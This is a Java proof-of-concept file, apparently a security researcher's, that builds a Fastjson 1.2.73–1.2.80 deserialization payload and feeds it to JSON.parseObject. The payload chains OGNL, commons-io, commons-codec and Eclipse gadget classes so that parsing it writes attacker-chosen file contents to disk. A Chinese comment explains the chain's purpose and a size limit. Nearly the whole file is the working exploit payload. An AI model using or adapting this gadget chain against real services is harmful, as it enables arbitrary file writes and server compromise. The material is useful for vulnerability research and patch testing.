package test;
import java.io.InputStream;
import java.net.URL;
import java.util.Arrays;
import java.util.Base64;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;


public class Fastjson26_ognl_io_write_4 {
    public static void main(String[] args) throws Exception {
    	String url = "file:///D:/Downloads/1.txt";
    	InputStream input = new URL(url).openStream();
    	byte[] bs = new byte[input.available()];
    	input.read(bs);
    	String test = Base64.getEncoder().encodeToString(bs);
    	byte[] testbs = test.getBytes();
    	
    	//1.2.73-1.2.80 ognl-3.2.21 commons-io-2.2 aspectjtools-1.9.6 commons-codec-1.6
    	//这条链主要是为了解决1-3的io链无法写入复杂文件结构，文件依旧需要大于8kb才能写入
    	
        String poc1 = "\r\n"
        		+ "{\r\n"
        		+ "	\"su14\": {\r\n"
        		+ "		\"@type\": \"java.lang.Exception\",\r\n"
        		+ "		\"@type\": \"ognl.OgnlException\"\r\n"
        		+ "	},\r\n"
        		+ "	\"su15\": {\r\n"
        		+ "		\"@type\": \"java.lang.Class\",\r\n"
        		+ "		\"val\": {\r\n"
        		+ "			\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
        		+ "			{\r\n"
        		+ "				\"@type\": \"java.lang.String\"\r\n"
        		+ "				\"@type\": \"ognl.OgnlException\",\r\n"
        		+ "				\"_evaluation\": \"\"\r\n"
        		+ "			}\r\n"
        		+ "		},\r\n"
        		+ "		\"su16\": {\r\n"
        		+ "			\"@type\": \"ognl.Evaluation\",\r\n"
        		+ "			\"node\": {\r\n"
        		+ "				\"@type\": \"ognl.ASTMethod\",\r\n"
        		+ "				\"p\": {\r\n"
        		+ "					\"@type\": \"ognl.OgnlParser\",\r\n"
        		+ "					\"stream\": {\r\n"
        		+ "  \"@type\":\"org.apache.commons.io.input.BOMInputStream\",\r\n"
        		+ "  \"delegate\":{\r\n"
        		+ "    \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
        		+ "    \"input\":{\r\n"
        		+ "      \"@type\": \"org.apache.commons.codec.binary.Base64InputStream\",\r\n"
        		+ "      \"in\":{\r\n"
        		+ "        \"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\",\r\n"
        		+ "        \"charset\":\"utf-8\",\r\n"
        		+ "        \"bufferSize\": 1024,\r\n"
    			+ "        \"s\":{\"@type\":\"java.lang.String\"\""+test+"\"\r\n"
        		+ "      },\r\n"
        		+ "      \"doEncode\":false,\r\n"
        		+ "      \"lineLength\":1024,\r\n"
        		+ "      \"lineSeparator\":\"5ZWKCg==\",\r\n"
        		+ "      \"decodingPolicy\":0\r\n"
        		+ "    },\r\n"
        		+ "    \"branch\":{\r\n"
        		+ "      \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\r\n"
        		+ "      \"targetPath\":\"1.txt\"\r\n"
        		+ "    },\r\n"
        		+ "    \"closeBranch\":true\r\n"
        		+ "  },\r\n"
        		+ "  \"include\":true,\r\n"
        		+ "  \"boms\":[{\r\n"
        		+ "                  \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
        		+ "                  \"charsetName\": \"UTF-8\",\r\n"
    			+ "                  \"bytes\":"+Arrays.toString(testbs)+"\r\n"
        		+ "                }],\r\n"
        		+ "}\r\n"
        		+ "				}\r\n"
        		+ "			}\r\n"
        		+ "		},\r\n"
        		+ "		\"su17\": {\r\n"
        		+ "			\"$ref\": \"$.su16.node.p.stream\"\r\n"
        		+ "		},\r\n"
        		+ "		\"su18\": {\r\n"
        		+ "			\"$ref\": \"$.su17.bOM.bytes\"\r\n"
        		+ "		}\r\n"
        		+ "	}";
        System.out.println(poc1);
        JSON.parseObject(poc1);
    }
}
